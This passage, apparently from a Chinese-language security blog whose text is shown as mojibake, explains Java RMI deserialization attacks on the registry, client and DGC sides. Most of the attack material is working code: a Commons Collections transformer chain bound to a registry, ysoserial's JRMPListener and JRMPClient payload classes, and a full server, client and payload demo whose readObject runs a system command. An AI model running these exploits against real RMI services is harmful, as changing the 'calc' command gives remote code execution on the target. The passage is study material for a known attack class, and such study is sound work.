class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// è¿æ¥ Registry</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//ä½¿ç”¨ AnnotationInvocationHandler åŠ¨æ€ä»£ç† Remote</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, getEvilClass());<br><br>        <span class="hljs-comment">//ä½¿ç”¨åŠ¨æ€ä»£ç†åˆå§‹åŒ– AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br>        <span class="hljs-comment">//ä½¿ç”¨ AnnotationInvocationHandler åŠ¨æ€ä»£ç† Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">//bind åˆ° Registry æ—¶ä¼šè§¦å‘ååºåˆ—åŒ–</span><br>        registry.rebind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, remote);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// åˆå§‹åŒ– Hashmap</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">// åˆ›å»º ChainedTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ Registry ç«¯å…·æœ‰ç›¸åº”çš„ä¾èµ–åŠç›¸åº” JDK ç‰ˆæœ¬éœ€æ±‚ã€‚</p><p>è¿™ä¸ªæ”»å‡»æ‰‹æ®µå®é™…ä¸Šå°±æ˜¯ ysoserial ä¸­çš„ <strong>ysoserial.exploit.RMIRegistryExploit</strong> çš„å®ç°åŸç†ã€‚</p><p>é™¤äº† bindï¼Œç”±äº lookup&#x2F;rebind ç­‰æ–¹æ³•å‡é€šè¿‡ååºåˆ—åŒ–ä¼ é€’æ•°æ®ï¼Œå› æ­¤æ­¤å¤„çš„å®é™…æ”»å‡»æ‰‹æ®µä¸æ­¢ bind ä¸€ç§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåä¹‰ä¸Šçš„ Server ç«¯å’Œ Client ç«¯éƒ½å¯ä»¥æ”»å‡» Registry ç«¯ã€‚</p><h3 id="Client-ç«¯-Attack"><a href="#Client-ç«¯-Attack" class="headerlink" title="Client ç«¯ Attack"></a>Client ç«¯ Attack</h3><p>å¦‚æœæ”»å‡»çš„ç›®æ ‡ä½œä¸º Client ç«¯ï¼Œä¹Ÿå°±æ˜¯åœ¨ Registry åœ°å€å¯æ§ï¼Œæˆ– Registry&#x2F;Server ç«¯å¯æ§ï¼Œä¹Ÿæ˜¯å¯ä»¥å¯¼è‡´æ”»å‡»çš„ã€‚å®¢æˆ·ç«¯ä¸»è¦æœ‰ä¸¤ä¸ªäº¤äº’è¡Œä¸ºï¼Œç¬¬ä¸€æ˜¯ä» Registry ç«¯è·å–è°ƒç”¨æœåŠ¡çš„ stub å¹¶ååºåˆ—åŒ–ï¼Œç¬¬äºŒæ­¥æ˜¯è°ƒç”¨æœåŠ¡åè·å–æ‰§è¡Œç»“æœå¹¶ååºåˆ—åŒ–ã€‚</p><p>è¿™éƒ¨åˆ†æ”»å‡»å®æˆ˜æ„ä¹‰è¾ƒå°‘ï¼Œå¹¶ä¸”ä¸ä¸Šè¿°è®¨è®ºçš„æ”»å‡» Server ç«¯å’Œ Registry ç«¯çš„æ”»å‡»éƒ½æ˜¯é•œåƒè¡Œä¸ºï¼Œæ‰€ä»¥è¿™é‡Œç®€å•æè¿°ä¸€ä¸‹æµç¨‹å°±ä¸å†æ¼”ç¤ºäº†ã€‚</p><p>å®¢æˆ·ç«¯çš„æ”»å‡»å’Œä¸Šé¢çš„éƒ½ç±»ä¼¼ï¼Œå¤§æ¦‚å°±ä¸‹é¢å‡ ä¸ªæ”»å‡»ç‚¹</p><ul><li>æ¶æ„Serverè¿”å›æ–¹æ³•è°ƒç”¨ç»“æœ</li><li>æ¶æ„Server(Registry)è¿”å›Stub</li><li>åŠ¨æ€ç±»åŠ è½½ï¼ˆServerè¿”å›çš„è°ƒç”¨ç»“æœè‹¥ä¸ºå®¢æˆ·ç«¯ä¸å­˜åœ¨çš„ç±»ï¼Œå®¢æˆ·ç«¯ä¹Ÿæ”¯æŒåŠ¨æ€åŠ è½½ï¼‰</li></ul><h3 id="DGC-Attack"><a href="#DGC-Attack" class="headerlink" title="DGC Attack"></a>DGC Attack</h3><p><strong>DGCï¼ˆDistributed Garbage Collectionï¼‰</strong>â€”â€” åˆ†å¸ƒå¼åƒåœ¾å›æ”¶ï¼Œå½“ Server ç«¯è¿”å›ä¸€ä¸ªå¯¹è±¡åˆ° Client ç«¯ï¼ˆè¿œç¨‹æ–¹æ³•çš„è°ƒç”¨æ–¹ï¼‰æ—¶ï¼Œå…¶è·Ÿè¸ªè¿œç¨‹å¯¹è±¡åœ¨ Client ç«¯ä¸­çš„ä½¿ç”¨ã€‚å½“å†æ²¡æœ‰æ›´å¤šçš„å¯¹ Client è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨æ—¶ï¼Œæˆ–è€…å¦‚æœå¼•ç”¨çš„â€œç§Ÿå€Ÿâ€è¿‡æœŸå¹¶ä¸”æ²¡æœ‰æ›´æ–°ï¼ŒæœåŠ¡å™¨å°†åƒåœ¾å›æ”¶è¿œç¨‹å¯¹è±¡ã€‚å¯åŠ¨ä¸€ä¸ª RMI æœåŠ¡ï¼Œå°±ä¼šä¼´éšç€ DGC æœåŠ¡ç«¯çš„å¯åŠ¨ã€‚</p><p>RMI å®šä¹‰äº†ä¸€ä¸ª <code>java.rmi.dgc.DGC</code> æ¥å£ï¼Œæä¾›äº†ä¸¤ä¸ªæ–¹æ³• <code>dirty</code> å’Œ <code>clean</code>ï¼š</p><ul><li>å®¢æˆ·ç«¯æƒ³è¦ä½¿ç”¨æœåŠ¡ç«¯ä¸Šçš„è¿œç¨‹å¼•ç”¨ï¼Œä½¿ç”¨ <code>dirty</code> æ–¹æ³•æ¥æ³¨å†Œä¸€ä¸ªã€‚åŒæ—¶è¿™è¿˜è·Ÿç§Ÿæˆ¿å­ä¸€æ ·ï¼Œè¿‡æ®µæ—¶é—´ç»§ç»­ç”¨çš„è¯è¿˜è¦å†è°ƒç”¨ä¸€æ¬¡æ¥ç»­ç§Ÿã€‚</li><li>å®¢æˆ·ç«¯ä¸ä½¿ç”¨çš„æ—¶å€™ï¼Œéœ€è¦è°ƒç”¨ <code>clean</code> æ–¹æ³•æ¥æ¸…æ¥šè¿™ä¸ªè¿œç¨‹å¼•ç”¨ã€‚</li></ul><p>è¿™ä¸ªæ¥å£æœ‰ä¸¤ä¸ªå®ç°ç±»ï¼Œåˆ†åˆ«æ˜¯ <code>sun.rmi.transport.DGCImpl</code> ä»¥åŠ <code>sun.rmi.transport.DGCImpl_Stub</code>ï¼ŒåŒæ—¶è¿˜å®šä¹‰äº† <code>sun.rmi.transport.DGCImpl_Skel</code>ã€‚</p><p>è¿™ä¸ªå‘½åæ–¹å¼çœ‹ç€ç¡®å®éå¸¸çœ¼ç†Ÿã€‚</p><p>æ²¡é”™ï¼Œå¾ˆåƒ Registryã€RegistryImplã€RegistryImpl_Stubã€RegistryImpl_Skelï¼Œå®é™…ä¸Šä¸å•æ˜¯å‘½åç›¸è¿‘ï¼Œå¤„ç†é€»è¾‘ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚é€šè¿‡åœ¨æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¹‹é—´ä¼ é€’å¼•ç”¨ï¼Œä¾æ—§æ˜¯ Stub ä¸ Skel ä¹‹é—´çš„é€šä¿¡æ¨¡å¼ï¼šServer ç«¯å¯åŠ¨ DGCImplï¼Œåœ¨ Registry ç«¯æ³¨å†Œ DGCImpl_Stub ï¼ŒClient ç«¯è·å–åˆ° DGCImpl_Stubï¼Œé€šè¿‡å…¶ä¸ Server ç«¯é€šä¿¡ï¼ŒServer ç«¯ä½¿ç”¨ RegistryImpl_Skel æ¥å¤„ç†ã€‚</p><p>æ”»å‡»æ‰‹æ®µå°±æ˜¯</p><p>DGCImpl_Stub#dirty</p><p>DGCImpl_Skel#dispatch</p><p>è§ysoserialçš„<code>exploit.JRMPListener</code>å’Œ<code>exploit.JRMPClient</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPListener</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;UnicastRemoteObject&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> UnicastRemoteObject <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">jrmpPort</span> <span class="hljs-operator">=</span> Integer.parseInt(command);<br>        <span class="hljs-type">UnicastRemoteObject</span> <span class="hljs-variable">uro</span> <span class="hljs-operator">=</span> Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            RemoteRef.class<br>        &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastServerRef</span>(jrmpPort)<br>        &#125;);<br><br>        Reflections.getField(UnicastRemoteObject.class, <span class="hljs-string">&quot;port&quot;</span>).set(uro, jrmpPort);<br>        <span class="hljs-keyword">return</span> uro;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        PayloadRunner.run(JRMPListener.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPClient</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Registry&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> Registry <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        String host;<br>        <span class="hljs-type">int</span> port;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sep</span> <span class="hljs-operator">=</span> command.indexOf(<span class="hljs-string">&#x27;:&#x27;</span>);<br>        <span class="hljs-keyword">if</span> ( sep &lt; <span class="hljs-number">0</span> ) &#123;<br>            port = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">65535</span>);<br>            host = command;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            host = command.substring(<span class="hljs-number">0</span>, sep);<br>            port = Integer.valueOf(command.substring(sep + <span class="hljs-number">1</span>));<br>        &#125;<br>        <span class="hljs-type">ObjID</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjID</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt()); <span class="hljs-comment">// RMI registry</span><br>        <span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">te</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(host, port);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LiveRef</span>(id, te, <span class="hljs-literal">false</span>));<br>        <span class="hljs-type">RemoteObjectInvocationHandler</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjectInvocationHandler</span>(ref);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            Registry.class<br>        &#125;, obj);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());<br>        PayloadRunner.run(JRMPClient.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ”»å‡»çš„gadgetåˆ† UnicastRemoteObjectã€UnicastRefå’ŒRemoteObjectä¸‰ç§ã€‚è¿™é‡Œä¸åšè¿‡å¤šè§£é‡Šã€‚</p><p>æ€»ç»“ä¸º</p><ul><li>exploit<ul><li>JRMPListnerï¼šæ„é€ æ¶æ„JRMPæœåŠ¡å™¨ï¼Œè¿”å›å¼‚å¸¸è®©å®¢æˆ·ç«¯ååºåˆ—åŒ– <code>StreamRemoteCall#executeCall</code></li><li>JRMPClientï¼šå‘é€æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œæ‰“DGCæœåŠ¡ <code>DGCImpl_Skel#dispatch</code></li></ul></li><li>payloads<ul><li>JRMPListnerï¼š<code>UnicastRemoteObject</code>ååºåˆ—åŒ–æ—¶ä¼šå¯¼å‡ºå¯¹è±¡ï¼Œè§¦å‘JRMPç›‘å¬ç«¯å£ï¼Œé…åˆexploit.JRMPClientæ‰“</li><li>JRMPClientï¼š<code>UnicastRef</code>ååºåˆ—åŒ–æ—¶ä¼šè§¦å‘DGCçš„<code>ditry</code>ï¼Œé…åˆexploit.JRMPListneræ‰“</li></ul></li></ul><h2 id="Final-Test"><a href="#Final-Test" class="headerlink" title="Final Test"></a>Final Test</h2><p>æœ€åæµ…æµ…æ‰“ä¸€ä¸ªç®€å•ä½¿ç”¨RMIæœåŠ¡è°ƒç”¨è¿œç¨‹å¯¹è±¡ååºåˆ—åŒ–å¼¹calcä½œä¸ºæˆ‘æœ€åçš„ç»“æŸå§ï¼ŒJEP 290çš„bypassæ”¾åœ¨åé¢æ–‡ç« å†è¿›è¡Œå¤ç°ã€‚JNDIä¹ŸåŒæ ·ä¼šæ”¾åœ¨åé¢å†è¯¦ç»†å¤ç›˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream objectInputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        objectInputStream.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">RMITestImpl</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMITestImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8081</span>);<br>        registry.bind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>,rmiTest);<br>        System.out.println(<span class="hljs-string">&quot;RMI Server is listening ...&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>);<br>        <span class="hljs-type">RMITest</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> (RMITest) registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RMITest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMITestImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RMITest</span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RMITestImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> &#123;<br>        System.out.println(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/7.png" alt="7"></p><p>æŠ„äº†ä¸‹<a href="https://blog.csdn.net/uuzeray/article/details/135886709?ops_request_misc=%7B%22request_id%22:%22172199251516800186550713%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172199251516800186550713&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-135886709-null-null.nonecase&utm_term=RMI&spm=1018.2226.3001.4450">ã€å¿ƒå¾—ã€‘java JNDIé…åˆRMIå®ç°æ³¨å…¥ä¸ªäººç¬”è®°_${jndi:rmi:-CSDNåšå®¢</a>ï¼ˆæˆ‘æ˜¯æ‡’ç‹—ï¼‰</p><p>åŸç†å¾ˆç®€å•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>ã€å®šä¹‰è¿œç¨‹æ¥å£ (RMITest.java):  <br>Â· å®šä¹‰äº†ä¸€ä¸ªè¿œç¨‹æ¥å£ RMITestï¼Œå…¶ä¸­åŒ…å«ä¸¤ä¸ªæ–¹æ³• testcalc() å’Œ sayObject(Object obj)ã€‚<br>è¿™äº›æ–¹æ³•å£°æ˜æŠ›å‡º RemoteExceptionï¼Œä»¥ä¾¿åœ¨è¿œç¨‹è°ƒç”¨æ—¶å¤„ç†å¯èƒ½çš„ç½‘ç»œé—®é¢˜ã€‚<br><br><span class="hljs-number">2</span>ã€å®ç°è¿œç¨‹æ¥å£ (RMITestImpl.java):  <br>Â· RMITestImpl ç±»å®ç°äº† RMITest æ¥å£ï¼Œå¹¶ç»§æ‰¿äº† UnicastRemoteObjectï¼Œä½¿å…¶æˆä¸ºä¸€ä¸ªè¿œç¨‹å¯¹è±¡ã€‚<br>Â· åœ¨ testcalc() æ–¹æ³•ä¸­ï¼Œä½¿ç”¨ Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>) æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¼¹å‡ºè®¡ç®—å™¨ã€‚<br>Â· sayObject(Object obj) æ–¹æ³•ç®€å•åœ°æ‰“å°ä¼ å…¥çš„å¯¹è±¡ã€‚<br><br><span class="hljs-number">3</span>ã€åˆ›å»ºå¹¶å¯åŠ¨RMIæœåŠ¡å™¨ (RMIServer.java):  <br>Â· åœ¨ main æ–¹æ³•ä¸­ï¼Œåˆ›å»º RMITestImpl çš„å®ä¾‹ã€‚<br>Â· ä½¿ç”¨ LocateRegistry.createRegistry(<span class="hljs-number">8081</span>) åˆ›å»ºä¸€ä¸ªåœ¨ç«¯å£ <span class="hljs-number">8081</span> ä¸Šç›‘å¬çš„ RMI æ³¨å†Œè¡¨ã€‚<br>Â· å°† RMITestImpl 